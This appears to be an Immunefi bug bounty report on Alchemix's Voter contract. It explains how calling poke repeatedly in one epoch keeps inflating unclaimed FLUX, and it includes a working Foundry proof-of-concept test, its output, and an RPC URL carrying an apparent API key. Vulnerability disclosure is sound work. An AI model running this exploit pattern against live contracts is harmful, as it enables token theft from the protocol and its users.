# 31386 - \[SC - Critical] Malicious user can steal FLUX token by abusing ...

Submitted on May 17th 2024 at 22:21:25 UTC by @jasonxiale for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31386

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol>

Impacts:

* Theft of unclaimed yield

## Description

## Brief/Intro

Malicious user can steal FLUX token by abusing `Voter.poke`

## Vulnerability Details

In [Voter.poke](https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L195-L212) funciton, there is not limitation how many time it can be called within one epoch, and at the end of the function, `Voter._vote` is called.

```solidity
195     function poke(uint256 _tokenId) public {
	...
211         _vote(_tokenId, _poolVote, _weights, _boost);
212     }
```

In [Voter.\_vote](https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L412-L455), `IFluxToken(FLUX).accrueFlux(_tokenId);` is calle to accrue Flux token in [Voter.sol#L423](https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L423)

And in [FluxToken.accrueFlux](https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/FluxToken.sol#L188-L192), the function will check the amount of claimable flux and than update `FluxToken.unclaimedFlux`

```solidity
187     /// @inheritdoc IFluxToken
188     function accrueFlux(uint256 _tokenId) external {
189         require(msg.sender == voter, "not voter");
190         uint256 amount = IVotingEscrow(veALCX).claimableFlux(_tokenId);
191         unclaimedFlux[_tokenId] += amount;
192     }
```

[VotingEscrow.claimableFlux](https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L377-L385) is defined as:

```solidity
 377     function claimableFlux(uint256 _tokenId) public view returns (uint256) {
 378         // If the lock is expired, no flux is claimable at the current epoch
 379         if (block.timestamp > locked[_tokenId].end) {
 380             return 0;
 381         }
 382 
 383         // Amount of flux claimable is <fluxPerVeALCX> percent of the balance 
 384         return (_balanceOfTokenAt(_tokenId, block.timestamp) * fluxPerVeALCX) / BPS;
 385     }
```

**As we can see above, `claimableFlux` only calcuate the tokenId's voting power, it doesn't record if the Flux has been claimed already.** So if a malicious user keep calling `Voter.poke`, his tokenId's unclaimedFlux will keeping increasing.

## Impact Details

Malicious user can steal FLUX token by abusing `Voter.poke`

## References

Add any relevant links to documentation or code

## Proof of Concept

Put the following code in `src/test/Voting.t.sol` and run

```bash
FOUNDRY_PROFILE=default forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/0TbY2mhyGA4gLPShfh-PwBlQ3PDNUdL1 --fork-block-number 17133822 --mc VotingTest --mt testAlicePoke -vv
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for src/test/Voting.t.sol:VotingTest
[PASS] testAlicePoke() (gas: 2564522)
Logs:
  getUnclaimedFlux:  1879449739964023604
  getUnclaimedFlux:  2799996511899518614
  getUnclaimedFlux:  3720543283835013624

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.59ms (1.90ms CPU time)

Ran 1 test suite in 1.29s (5.59ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

As we can see from the above output, every time Alice calls `Voter.poke`, her unclaimed Flux will increase.

```solidity
    function testAlicePoke() public {
        address Alice = address(0x11001100);
        uint256 tokenId = createVeAlcx(Alice, TOKEN_1, MAXTIME, false);

        hevm.warp(block.timestamp + nextEpoch);

        address[] memory pools = new address[](1);
        pools[0] = alETHPool;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 5000;

        hevm.prank(Alice);
        voter.vote(tokenId, pools, weights, 0);

        address[] memory poolVote = voter.getPoolVote(tokenId);
        assertEq(poolVote[0], alETHPool);

        // Next epoch
        hevm.warp(block.timestamp + nextEpoch);

        hevm.prank(Alice);
        voter.poke(tokenId);
        console2.log("getUnclaimedFlux: ", flux.getUnclaimedFlux(tokenId));

        hevm.prank(Alice);
        voter.poke(tokenId);
        console2.log("getUnclaimedFlux: ", flux.getUnclaimedFlux(tokenId));

        hevm.prank(Alice);
        voter.poke(tokenId);
        console2.log("getUnclaimedFlux: ", flux.getUnclaimedFlux(tokenId));
    } 
```
